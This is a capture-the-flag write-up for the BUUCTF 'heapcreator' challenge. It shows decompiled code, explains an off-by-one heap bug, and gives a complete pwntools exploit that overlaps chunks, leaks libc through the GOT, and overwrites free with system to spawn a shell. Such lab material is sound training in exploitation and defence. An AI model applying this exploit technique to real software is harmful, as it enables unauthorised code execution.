# BUU-heapcreator

## checksec

```shell
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## IDA

**create**

```c
unsigned __int64 create_heap()
{
  __int64 v0; // rbx
  int i; // [rsp+4h] [rbp-2Ch]
  size_t size; // [rsp+8h] [rbp-28h]
  char buf[8]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v5; // [rsp+18h] [rbp-18h]

  v5 = __readfsqword(0x28u);
  for ( i = 0; i <= 9; ++i )
  {
    if ( !*(&heaparray + i) )
    {
      *(&heaparray + i) = malloc(0x10uLL);
      if ( !*(&heaparray + i) )
      {
        puts("Allocate Error");
        exit(1);
      }
      printf("Size of Heap : ");
      read(0, buf, 8uLL);
      size = atoi(buf);
      v0 = (__int64)*(&heaparray + i);
      *(_QWORD *)(v0 + 8) = malloc(size);
      if ( !*((_QWORD *)*(&heaparray + i) + 1) )
      {
        puts("Allocate Error");
        exit(2);
      }
      *(_QWORD *)*(&heaparray + i) = size;
      printf("Content of heap:");
      read_input(*((_QWORD *)*(&heaparray + i) + 1), size);
      puts("SuccessFul");
      return __readfsqword(0x28u) ^ v5;
    }
  }
  return __readfsqword(0x28u) ^ v5;
}
```

**edit**

```c
unsigned __int64 edit_heap()
{
  int v1; // [rsp+Ch] [rbp-14h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Index :");
  read(0, buf, 4uLL);
  v1 = atoi(buf);
  if ( v1 < 0 || v1 > 9 )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( *(&heaparray + v1) )
  {
    printf("Content of heap : ");
    read_input(*((_QWORD *)*(&heaparray + v1) + 1), *(_QWORD *)*(&heaparray + v1) + 1LL);
    puts("Done !");
  }
  else
  {
    puts("No such heap !");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

**show**

```c
unsigned __int64 show_heap()
{
  int v1; // [rsp+Ch] [rbp-14h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Index :");
  read(0, buf, 4uLL);
  v1 = atoi(buf);
  if ( v1 < 0 || v1 > 9 )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( *(&heaparray + v1) )
  {
    printf("Size : %ld\nContent : %s\n", *(_QWORD *)*(&heaparray + v1), *((const char **)*(&heaparray + v1) + 1));
    puts("Done !");
  }
  else
  {
    puts("No such heap !");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

**delete**

```c
unsigned __int64 delete_heap()
{
  int v1; // [rsp+Ch] [rbp-14h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Index :");
  read(0, buf, 4uLL);
  v1 = atoi(buf);
  if ( v1 < 0 || v1 > 9 )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( *(&heaparray + v1) )
  {
    free(*((void **)*(&heaparray + v1) + 1));
    free(*(&heaparray + v1));
    *(&heaparray + v1) = 0LL;
    puts("Done !");
  }
  else
  {
    puts("No such heap !");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

`crearte`时，申请一个0x10的控制chunk，存放申请chunk的size和地址。

在`edit`中有一个`off-by-one`，可以利用用来修改控制chunk，向其size写一个较大的值，`free`掉。被我们修改的控制chunk包含了正在使用的chunk。且用户申请的chunk在控制chunk的上面，可以覆盖其内容。通过修改chunk指针，leak libc并修改got表。

## exp

```python
from pwn import *
from LibcSearcher import LibcSearcher
from struct import pack
leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, addr))
context.log_level="DEBUG"
#context.arch="amd64"

local=0
binary='./heapcreator'
#gdb.attach(sh)
if local:
	sh=process(binary)
else:
	sh=remote('node3.buuoj.cn',27001)

elf = ELF(binary,checksec=False)
#libc = ELF('./libc-2.271.so')
#gdb.attach(sh)

free_got = elf.got['free']

def add(size, content):
    sh.sendline("1")
    sh.sendafter("Size of Heap : ", str(size))
    sh.sendafter("Content of heap:", str(content))

def edit(index, content):
    sh.sendline("2")
    sh.sendafter("Index :",str(index))
    sh.sendafter("Content of heap : ", str(content))
    
def show(index):
    sh.sendline("3")
    sh.sendafter("Index :",str(index))
    
def free(index):
    sh.sendline("4")
    sh.sendafter("Index :",str(index))   

add(0x18,'a'*0x18) #0
add(0x10,'b'*0x10) #1
add(0x10,'c'*0x10) #2
add(0x10,'b'*0x10) #3

#gdb.attach(sh)
edit(0, '/bin/sh\x00'*3+'\x81')
free(1)
add(0x70, p64(0)*8+p64(0x8)+p64(free_got)) #1
show(2)
free_addr = u64(sh.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
leak('free',hex(free_addr))
libc = LibcSearcher("free", free_addr)
libcbase = free_addr - libc.dump("free")
system = libcbase + libc.dump('system')
#gdb.attach(sh)
edit(2,p64(system))
free(0)

sh.interactive()
```

